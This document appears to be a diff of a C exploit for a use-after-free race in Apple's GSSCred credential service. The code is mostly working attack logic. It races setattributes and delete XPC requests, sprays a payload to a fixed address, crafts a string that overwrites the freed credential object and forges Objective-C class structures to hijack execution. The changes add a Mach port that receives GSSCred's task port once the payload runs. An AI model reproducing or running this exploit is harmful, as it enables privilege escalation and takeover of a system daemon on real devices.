@@ -449,100 +449,16 @@
 
 #include "gsscred_race.h"
 
+#include "apple_private.h"
+#include "log.h"
+#include "payload.h"
+
 #include <assert.h>
 #include <CoreFoundation/CoreFoundation.h>
-#include <mach/mach.h>
-#include <objc/objc.h>
 #include <stdbool.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <xpc/xpc.h>
-
-#if __x86_64__
-
-// ---- Header files not available on iOS ---------------------------------------------------------
-
-#include <mach/mach_vm.h>
-
-#else /* __x86_64__ */
-
-// If we're not on x86_64, then we probably don't have access to the above headers. The following
-// definitions are copied directly from the macOS header files.
-
-// ---- Definitions from mach/mach_vm.h -----------------------------------------------------------
-
-extern
-kern_return_t mach_vm_allocate
-(
-	vm_map_t target,
-	mach_vm_address_t *address,
-	mach_vm_size_t size,
-	int flags
-);
-
-extern
-kern_return_t mach_vm_deallocate
-(
-	vm_map_t target,
-	mach_vm_address_t address,
-	mach_vm_size_t size
-);
-
-extern
-kern_return_t mach_vm_remap
-(
-	vm_map_t target_task,
-	mach_vm_address_t *target_address,
-	mach_vm_size_t size,
-	mach_vm_offset_t mask,
-	int flags,
-	vm_map_t src_task,
-	mach_vm_address_t src_address,
-	boolean_t copy,
-	vm_prot_t *cur_protection,
-	vm_prot_t *max_protection,
-	vm_inherit_t inheritance
-);
-
-#endif /* __x86_64__ */
-
-// The following definitions are not available in the header files for any platform. They are
-// copied from the corresponding header files available at opensource.apple.com.
-
-// ---- Definitions from libdispatch private/data_private.h ---------------------------------------
-
-/*!
- * @const DISPATCH_DATA_DESTRUCTOR_VM_DEALLOCATE
- * @discussion The destructor for dispatch data objects that have been created
- * from buffers that require deallocation using vm_deallocate.
- */
-#define DISPATCH_DATA_DESTRUCTOR_VM_DEALLOCATE \
-		(_dispatch_data_destructor_vm_deallocate)
-API_AVAILABLE(macos(10.8), ios(6.0)) DISPATCH_LINUX_UNAVAILABLE()
-DISPATCH_DATA_DESTRUCTOR_TYPE_DECL(vm_deallocate);
-
-// ---- Debugging macros --------------------------------------------------------------------------
-
-#ifndef DEBUG_LEVEL
-#define DEBUG_LEVEL DEBUG
-#endif
-
-#define DEBUG_AT_LEVEL(level)	DEBUG && level <= DEBUG_LEVEL
-
-#if DEBUG
-#define DEBUG_TRACE(fmt, ...)		printf("Debug: "fmt"\n", ##__VA_ARGS__)
-#define DEBUG_TRACE_LEVEL(level, fmt, ...)			\
-	do {							\
-		if (level <= DEBUG_LEVEL) {			\
-			DEBUG_TRACE(fmt, ##__VA_ARGS__);	\
-		}						\
-	} while (0)
-#else
-#define DEBUG_TRACE(fmt, ...)		do {} while (0)
-#define DEBUG_TRACE_LEVEL(fmt, ...)	do {} while (0)
-#endif
-#define WARNING(fmt, ...)		printf("Warning: "fmt"\n", ##__VA_ARGS__)
-#define ERROR(fmt, ...)			printf("Error: "fmt"\n", ##__VA_ARGS__)
 
 // ---- Some definitions from Heimdal-520 ---------------------------------------------------------
 
@@ -557,8 +473,8 @@ static const char *kHEIMAttrBundleIdentifierACL = "kHEIMAttrBundleIdentifierACL"
 
 static const char *GSSCRED_SERVICE_NAME = "com.apple.GSSCred";
 
-static const size_t   UAF_STRING_SIZE               = 0x20;
 static const size_t   UAF_STRING_COUNT              = 10000;
+
 static const unsigned POST_CREATE_CREDENTIAL_DELAY  = 10000;	// 10 ms
 static const unsigned RETRY_RACE_DELAY              = 200000;	// 200 ms
 
@@ -570,40 +486,15 @@ static const size_t   MAX_TRIES = 300;
 // ---- Parameters for building the controlled page -----------------------------------------------
 
 // These parameters were largely determined through trial and error. We want to send enough data to
-// the target process that DATA_ADDRESS is mapped with controlled contents.
-static const size_t    DATA_SIZE                = 0x4000;
-static const size_t    DATA_COUNT_PER_BLOCK     = 0x10;
-static const size_t    DATA_BLOCKS_PER_MAPPING  = 0x100;
-static const size_t    DATA_MAPPING_COUNT       = 10;
-static const uintptr_t DATA_ADDRESS             = 0x0000000120204000;
-
-// These are the offsets of the various objects in our controlled data. The full structures of
-// these objects overlap so as to pack them at the front of the page, leaving the rest of the
-// contents available for JOP use.
-static const ssize_t DATA_OFFSET__HeimMech = 0x0010;	// 10 - 18  ->  20 - 28
-static const ssize_t DATA_OFFSET__name     = 0x0028;	//  0 -  8  ->  28 - 30
-static const ssize_t DATA_OFFSET__class    = 0x0000;	// 10 - 1c  ->  10 - 1c
-static const ssize_t DATA_OFFSET__bucket   = 0x0000;	//  0 - 10  ->   0 - 10
-
-// ---- Structure offsets -------------------------------------------------------------------------
-
-static const size_t OFFSET__CFString__characters = 0x11;
-static const size_t OFFSET__HeimCred__mech       = 0x20;
-static const size_t OFFSET__HeimMech__name       = 0x10;
-static const size_t OFFSET__objc_object__isa     = 0;
-static const size_t OFFSET__objc_class__buckets  = 0x10;
-static const size_t OFFSET__objc_class__mask     = 0x18;
-static const size_t OFFSET__bucket_t__key        = 0;
-static const size_t OFFSET__bucket_t__imp        = 8;
+// the target process that GSSCRED_RACE_PAYLOAD_ADDRESS is mapped with the contents of the payload.
+static const size_t PAYLOAD_COUNT_PER_BLOCK    = 0x10;
+static const size_t PAYLOAD_BLOCKS_PER_MAPPING = 0x100;
+static const size_t PAYLOAD_MAPPING_COUNT      = 10;
 
 // ---- Exploit implementation --------------------------------------------------------------------
 
 // State for managing the GSSCred race.
 struct gsscred_race_state {
-	// The connection on which we will send the setattributes request.
-	xpc_connection_t setattributes_connection;
-	// The connection on which we will send the delete request.
-	xpc_connection_t delete_connection;
 	// The create request, which will create the credential.
 	xpc_object_t create_request;
 	// The setattributes request, which will trigger the UAF.
@@ -612,67 +503,19 @@ struct gsscred_race_state {
 	xpc_object_t delete_request;
 	// A semaphore that will be signalled when we receive the setattributes reply.
 	dispatch_semaphore_t setattributes_reply_done;
+	// A Mach port that will receive the task port from GSSCred when the exploit payload runs
+	// in GSSCred's address space.
+	mach_port_t listener_port;
+	// The connection on which we will send the setattributes request.
+	xpc_connection_t setattributes_connection;
+	// The connection on which we will send the delete request.
+	xpc_connection_t delete_connection;
 	// Whether either connection has been interrupted, indicating a crash.
 	bool connection_interrupted;
 	// The current delay between sending the setattributes request and sending the delete
 	// request.
 	unsigned setattributes_to_delete_delay;
 };
-
-// Generate the string that will be repeatedly deserialized and allocated by GSSCred. If all goes
-// according to plan, the HeimCred object will be freed and then reallocated as a CFString, and the
-// CFString's inline characters will overlap with the HeimCred's "mech" pointer. Thus, after we've
-// corrupted the HeimCred, its "mech" field will point to the heap-sprayed data.
-static void
-gsscred_race_generate_uaf_string(char *uaf_string) {
-	memset(uaf_string, 'A', UAF_STRING_SIZE);
-	uint8_t *fake_HeimCred = (uint8_t *)uaf_string - OFFSET__CFString__characters;
-	uint8_t *HeimCred_mech = fake_HeimCred + OFFSET__HeimCred__mech;
-	*(uint64_t *)HeimCred_mech = DATA_ADDRESS + DATA_OFFSET__HeimMech;
-}
-
-// Generate the payload that will be sprayed in the address space of the target process and
-// hopefully be mapped at DATA_ADDRESS. GSSCred will pass the name pointer in the fake HeimMech to
-// CFDictionaryGetValue(), which will cause objc_msgSend() to be called on the fake name object
-// with the "hash" selector.
-static void
-gsscred_race_generate_payload(uint8_t *payload) {
-	// Fill unused space with a distinctive byte pattern.
-	memset(payload, 0x51, DATA_SIZE);
-
-	// Get pointers to each region of the local buffer.
-	uint8_t *payload_HeimMech = payload + DATA_OFFSET__HeimMech;
-	uint8_t *payload_name     = payload + DATA_OFFSET__name;
-	uint8_t *payload_class    = payload + DATA_OFFSET__class;
-	uint8_t *payload_bucket   = payload + DATA_OFFSET__bucket;
-
-	// Get the addresses of each region in the target process.
-	uint64_t address_name     = DATA_ADDRESS + DATA_OFFSET__name;
-	uint64_t address_class    = DATA_ADDRESS + DATA_OFFSET__class;
-	uint64_t address_bucket   = DATA_ADDRESS + DATA_OFFSET__bucket;
-
-	// Construct the HeimMech object. We only care about the "name" field, which is usually a
-	// pointer to a CFString.
-	*(uint64_t *)(payload_HeimMech + OFFSET__HeimMech__name) = address_name;
-
-	// Construct the name object. We only care about the "isa" field, which is a pointer to the
-	// objc_class for this instance.
-	*(uint64_t *)(payload_name + OFFSET__objc_object__isa) = address_class;
-
-	// Construct the Objective-C class object. Since the fake name object will have the "hash"
-	// method called, we want the fake class object to have a cache hit for the "hash"
-	// selector. We ensure that objc_msgSend() always starts at the first bucket by setting
-	// "mask" to 0.
-	*(uint64_t *)(payload_class + OFFSET__objc_class__buckets) = address_bucket;
-	*(uint32_t *)(payload_class + OFFSET__objc_class__mask)    = 0;
-
-	// Construct the bucket_t that has a hit for the "hash" selector. Since the shared cache is
-	// mapped at the same address in all processes, the "hash" selector will reside at the same
-	// address in GSSCred as it does in our process.
-	uint64_t sel_hash = (uint64_t) sel_registerName("hash");
-	*(uint64_t *)(payload_bucket + OFFSET__bucket_t__key) = sel_hash;
-	*(uint64_t *)(payload_bucket + OFFSET__bucket_t__imp) = 0x0011223344556677;
-}
 
 // Generate a large mapping consisting of many copies of the given data. Note that changes to the
 // beginning of the mapping will be reflected to other parts of the mapping, but possibly only if
@@ -730,35 +573,46 @@ fail_0:
 // Build the XPC spray data object that will (hopefully) get controlled data allocated at a fixed
 // address in GSSCred.
 static xpc_object_t
-gsscred_race_build_spray_data_object() {
-	// First generate the data we want to spray.
-	size_t block_size = DATA_SIZE * DATA_COUNT_PER_BLOCK;
-	uint8_t *data_block = malloc(block_size);
-	assert(data_block != NULL);
-	gsscred_race_generate_payload(data_block);
-	// Repeat the data several times to create a bigger block of data. This helps with the
+gsscred_race_build_payload_spray(uint8_t *payload) {
+	// Repeat the payload several times to create a bigger payload block. This helps with the
 	// remapping process.
-	for (size_t i = 1; i < DATA_COUNT_PER_BLOCK; i++) {
-		memcpy(data_block + i * DATA_SIZE, data_block, DATA_SIZE);
+	size_t block_size = GSSCRED_RACE_PAYLOAD_SIZE * PAYLOAD_COUNT_PER_BLOCK;
+	uint8_t *payload_block = malloc(block_size);
+	assert(payload_block != NULL);
+	for (size_t i = 0; i < PAYLOAD_COUNT_PER_BLOCK; i++) {
+		memcpy(payload_block + i * GSSCRED_RACE_PAYLOAD_SIZE, payload,
+				GSSCRED_RACE_PAYLOAD_SIZE);
 	}
-	// Now create an even larger copy of that data block by remapping it several times
-	// consecutively. This object will take up the same amount of memory as the single data
+	// Now create an even larger copy of that payload block by remapping it several times
+	// consecutively. This object will take up the same amount of memory as the single payload
 	// block, despite covering a large virtual address range.
-	size_t map_size = block_size * DATA_BLOCKS_PER_MAPPING;
-	void *data_map = map_replicate(data_block, block_size, DATA_BLOCKS_PER_MAPPING);
-	assert(data_map != NULL);
-	free(data_block);
-	// Wrap the data mapping in a dispatch_data_t so that it isn't copied, then wrap that in an
-	// XPC data object. We leverage the internal DISPATCH_DATA_DESTRUCTOR_VM_DEALLOCATE data
+	size_t map_size = block_size * PAYLOAD_BLOCKS_PER_MAPPING;
+	void *payload_map = map_replicate(payload_block, block_size, PAYLOAD_BLOCKS_PER_MAPPING);
+	assert(payload_map != NULL);
+	free(payload_block);
+	// Wrap the payload mapping in a dispatch_data_t so that it isn't copied, then wrap that in
+	// an XPC data object. We leverage the internal DISPATCH_DATA_DESTRUCTOR_VM_DEALLOCATE data
 	// destructor so that dispatch_data_make_memory_entry() doesn't try to remap the data
 	// (which would cause us to be killed by Jetsam).
-	dispatch_data_t dispatch_data = dispatch_data_create(data_map, map_size,
+	dispatch_data_t dispatch_data = dispatch_data_create(payload_map, map_size,
 			NULL, DISPATCH_DATA_DESTRUCTOR_VM_DEALLOCATE);
 	assert(dispatch_data != NULL);
 	xpc_object_t xpc_data = xpc_data_create_with_dispatch_data(dispatch_data);
 	dispatch_release(dispatch_data);
 	assert(xpc_data != NULL);
 	return xpc_data;
+}
+
+// Create a Mach port that will receive a message sent by our exploit payload from GSSCred's
+// process.
+static void
+gsscred_race_create_listener_port(struct gsscred_race_state *state) {
+	mach_port_t port = MACH_PORT_NULL;
+	kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
+	assert(kr == KERN_SUCCESS);
+	kr = mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
+	assert(kr == KERN_SUCCESS);
+	state->listener_port = port;
 }
 
 // Build the request objects for the GSSCred race. We do this all upfront.
@@ -785,14 +639,19 @@ gsscred_race_build_requests(struct gsscred_race_state *state) {
 	xpc_release(create_attributes);
 	state->create_request = create_request;
 
-	// Generate the string that will be deserialized repeatedly and be used in the UAF to point
-	// to our controlled data at DATA_ADDRESS.
-	char uaf_string[UAF_STRING_SIZE];
-	gsscred_race_generate_uaf_string(uaf_string);
+	// Generate the UAF string and the exploit payload. The UAF string is the string that will
+	// be deserialized repeatedly in the hope that it overwrites the freed HeimCred, causing
+	// various object accesses to redirect to our exploit payload and eventually triggering
+	// controlled execution from the payload.
+	char uaf_string[GSSCRED_RACE_UAF_STRING_SIZE];
+	uint8_t *payload = malloc(GSSCRED_RACE_PAYLOAD_SIZE);
+	assert(payload != NULL);
+	gsscred_race_build_payload(uaf_string, payload);
 
-	// Generate the XPC data object that we will spray into GSSCred to map DATA_ADDRESS with
-	// controlled contents.
-	xpc_object_t spray_data_object = gsscred_race_build_spray_data_object();
+	// Generate the XPC data object that we will spray into GSSCred to map
+	// GSSCRED_RACE_PAYLOAD_ADDRESS with our exploit payload.
+	xpc_object_t payload_spray = gsscred_race_build_payload_spray(payload);
+	free(payload);
 
 	// Build the setattributes request for the target credential:
 	// {
@@ -816,17 +675,18 @@ gsscred_race_build_requests(struct gsscred_race_state *state) {
 		xpc_array_set_string(new_acl, XPC_ARRAY_APPEND, uaf_string);
 	}
 	xpc_dictionary_set_value(new_attributes, kHEIMAttrBundleIdentifierACL, new_acl);
-	for (size_t i = 0; i < DATA_MAPPING_COUNT; i++) {
+	for (size_t i = 0; i < PAYLOAD_MAPPING_COUNT; i++) {
 		char key[20];
 		snprintf(key, sizeof(key), "data_%zu", i);
-		xpc_dictionary_set_value(setattributes_request, key, spray_data_object);
+		xpc_dictionary_set_value(setattributes_request, key, payload_spray);
 	}
-	xpc_dictionary_set_string(setattributes_request, "command",    "setattributes");
-	xpc_dictionary_set_uuid(  setattributes_request, "uuid",       uuid);
-	xpc_dictionary_set_value( setattributes_request, "attributes", new_attributes);
+	xpc_dictionary_set_mach_send(setattributes_request, "mach_send",  state->listener_port);
+	xpc_dictionary_set_string(   setattributes_request, "command",    "setattributes");
+	xpc_dictionary_set_uuid(     setattributes_request, "uuid",       uuid);
+	xpc_dictionary_set_value(    setattributes_request, "attributes", new_attributes);
 	xpc_release(new_acl);
 	xpc_release(new_attributes);
-	xpc_release(spray_data_object);
+	xpc_release(payload_spray);
 	state->setattributes_request = setattributes_request;
 
 	// Build the delete request for the credential.
@@ -873,9 +733,9 @@ gsscred_race_open_connections(struct gsscred_race_state *state) {
 	// Create the connection on which we will send the setattributes message.
 	state->setattributes_connection = gsscred_xpc_connect(^(xpc_object_t event) {
 		gsscred_race_check_interrupted(state, event);
-#if DEBUG_AT_LEVEL(3)
+#if DEBUG_LEVEL(3)
 		char *desc = xpc_copy_description(event);
-		DEBUG_TRACE("setattributes connection event: %s", desc);
+		DEBUG_TRACE(3, "setattributes connection event: %s", desc);
 		free(desc);
 #endif
 	});
@@ -883,9 +743,9 @@ gsscred_race_open_connections(struct gsscred_race_state *state) {
 	// Create the connection on which we will send the delete message.
 	state->delete_connection = gsscred_xpc_connect(^(xpc_object_t event) {
 		gsscred_race_check_interrupted(state, event);
-#if DEBUG_AT_LEVEL(3)
+#if DEBUG_LEVEL(3)
 		char *desc = xpc_copy_description(event);
-		DEBUG_TRACE("delete connection event: %s", desc);
+		DEBUG_TRACE(3, "delete connection event: %s", desc);
 		free(desc);
 #endif
 	});
@@ -906,18 +766,18 @@ gsscred_race_close_connections(struct gsscred_race_state *state) {
 // Initialize the state for exploiting the GSSCred race condition.
 static void
 gsscred_race_init(struct gsscred_race_state *state) {
+	gsscred_race_create_listener_port(state);
 	gsscred_race_build_requests(state);
-	gsscred_race_open_connections(state);
 	state->setattributes_reply_done = dispatch_semaphore_create(0);
 }
 
 // Clean up all resources used by the GSSCred race state.
 static void
 gsscred_race_deinit(struct gsscred_race_state *state) {
-	gsscred_race_close_connections(state);
 	xpc_release(state->create_request);
 	xpc_release(state->setattributes_request);
 	xpc_release(state->delete_request);
+	mach_port_deallocate(mach_task_self(), state->listener_port);
 	dispatch_release(state->setattributes_reply_done);
 }
 
@@ -927,9 +787,9 @@ gsscred_race_create_credential_sync(struct gsscred_race_state *state) {
 	xpc_object_t reply = xpc_connection_send_message_with_reply_sync(
 			state->delete_connection,
 			state->create_request);
-#if DEBUG_AT_LEVEL(3)
+#if DEBUG_LEVEL(3)
 	char *desc = xpc_copy_description(reply);
-	DEBUG_TRACE("create reply: %s", desc);
+	DEBUG_TRACE(3, "create reply: %s", desc);
 	free(desc);
 #endif
 	bool success = (xpc_dictionary_get_value(reply, "error") == NULL);
@@ -950,10 +810,10 @@ gsscred_race_setattributes_async(struct gsscred_race_state *state) {
 			^(xpc_object_t reply) {
 		gsscred_race_check_interrupted(state, reply);
 		dispatch_semaphore_signal(state->setattributes_reply_done);
-#if DEBUG_AT_LEVEL(3)
+#if DEBUG_LEVEL(3)
 		// We never expect feedback.
 		char *desc = xpc_copy_description(reply);
-		DEBUG_TRACE("setattributes reply: %s", desc);
+		DEBUG_TRACE(3, "setattributes reply: %s", desc);
 		free(desc);
 		assert(xpc_dictionary_get_value(reply, "error") == NULL);
 #endif
@@ -967,9 +827,9 @@ gsscred_race_delete_credential_sync(struct gsscred_race_state *state) {
 	xpc_object_t reply = xpc_connection_send_message_with_reply_sync(
 			state->delete_connection,
 			state->delete_request);
-#if DEBUG_AT_LEVEL(3)
+#if DEBUG_LEVEL(3)
 	char *desc = xpc_copy_description(reply);
-	DEBUG_TRACE("delete reply: %s", desc);
+	DEBUG_TRACE(3, "delete reply: %s", desc);
 	free(desc);
 #endif
 	xpc_release(reply);
@@ -984,26 +844,26 @@ gsscred_race_synchronize(struct gsscred_race_state *state) {
 
 // Run the race condition.
 static bool
-gsscred_race_run() {
+gsscred_race_run(struct gsscred_race_state *state) {
 	bool success = false;
-	struct gsscred_race_state state;
 
-	gsscred_race_init(&state);
+	// Open the connections to the GSSCred service.
+	gsscred_race_open_connections(state);
 
 	// First send a delete message to make sure GSSCred is up and running, then give it time to
 	// initialize.
-	gsscred_race_delete_credential_sync(&state);
+	gsscred_race_delete_credential_sync(state);
 	sleep(1);
 
 	// Initialize the delay between setattributes and delete.
-	state.setattributes_to_delete_delay = INITIAL_SETATTRIBUTES_TO_DELETE_DELAY_US;
+	state->setattributes_to_delete_delay = INITIAL_SETATTRIBUTES_TO_DELETE_DELAY_US;
 
 	// Loop until we win.
 	for (size_t try = 1;; try++) {
-		DEBUG_TRACE("Trying %u", state.setattributes_to_delete_delay);
+		DEBUG_TRACE(1, "Trying %u", state->setattributes_to_delete_delay);
 
 		// Create the credential synchronously.
-		bool ok = gsscred_race_create_credential_sync(&state);
+		bool ok = gsscred_race_create_credential_sync(state);
 		if (!ok) {
 			ERROR("Could not create the credential");
 			break;
@@ -1017,28 +877,28 @@ gsscred_race_run() {
 		// pointer to the target credential on the stack and then loop continuously
 		// allocating memory. The reuse of this pointer later in the function is the UAF,
 		// and our race window is however long do_SetAttrs() spends in the allocation loop.
-		gsscred_race_setattributes_async(&state);
+		gsscred_race_setattributes_async(state);
 
 		// Sleep for awhile, until there's a good chance that the delete request will
 		// arrive in the middle of the race window.
-		usleep(state.setattributes_to_delete_delay);
+		usleep(state->setattributes_to_delete_delay);
 
 		// Send the delete message synchronously.
-		gsscred_race_delete_credential_sync(&state);
+		gsscred_race_delete_credential_sync(state);
 
 		// Wait for the setattributes request to finish.
-		gsscred_race_synchronize(&state);
+		gsscred_race_synchronize(state);
 
 		// If we got a Connection Interrupted error, then we crashed GSSCred.
-		if (state.connection_interrupted) {
-			DEBUG_TRACE("Crash!");
-			DEBUG_TRACE("Won the race after %zu %s", try,
+		if (state->connection_interrupted) {
+			DEBUG_TRACE(1, "Crash!");
+			DEBUG_TRACE(1, "Won the race after %zu %s", try,
 					(try == 1 ? "try" : "tries"));
 			success = true;
 			break;
 		}
 
-		DEBUG_TRACE_LEVEL(2, "Lost the race, trying again...");
+		DEBUG_TRACE(2, "Lost the race, trying again...");
 		// If we've run out of tries, give up.
 		if (try >= MAX_TRIES) {
 			ERROR("Could not win the race after %zu tries", try);
@@ -1046,15 +906,15 @@ gsscred_race_run() {
 		}
 
 		// Increase the delay.
-		state.setattributes_to_delete_delay += SETATTRIBUTES_TO_DELETE_DELAY_INCREMENT_US;
+		state->setattributes_to_delete_delay += SETATTRIBUTES_TO_DELETE_DELAY_INCREMENT_US;
 
 		// If we didn't get a Connection Interrupted error, then GSSCred is still running.
 		// Sleep for awhile to let GSSCred settle down, then try again.
 		usleep(RETRY_RACE_DELAY);
 	}
 
-	// Clean up all state.
-	gsscred_race_deinit(&state);
+	// Close the connections to GSSCred.
+	gsscred_race_close_connections(state);
 
 	return success;
 }
@@ -1062,6 +922,10 @@ gsscred_race_run() {
 // ---- Public API --------------------------------------------------------------------------------
 
 bool gsscred_race() {
-	DEBUG_TRACE("gsscred_race");
-	return gsscred_race_run();
+	DEBUG_TRACE(1, "gsscred_race");
+	struct gsscred_race_state state;
+	gsscred_race_init(&state);
+	bool success = gsscred_race_run(&state);
+	gsscred_race_deinit(&state);
+	return success;
 }
